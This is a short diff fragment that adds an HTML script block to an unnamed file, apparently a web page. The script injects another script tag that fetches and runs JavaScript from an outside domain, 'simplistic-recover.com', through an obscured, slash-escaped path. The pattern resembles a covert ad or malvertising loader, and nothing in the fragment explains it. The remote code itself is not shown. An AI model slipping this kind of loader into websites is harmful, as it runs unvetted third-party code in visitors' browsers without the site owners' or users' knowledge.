@@ -1,0 +1,12 @@
+<script>
+(function(nmzuu){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = nmzuu || {};
+s.src = "\/\/simplistic-recover.com\/bsXQVhs.d\/GIlZ0\/YVWCcu\/OeFmT9Ou\/ZOUvlfkiP\/T\/YM0zMIjMgx4\/O-DqEItZNUj\/Q\/yROwDtg\/4fMIgG";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
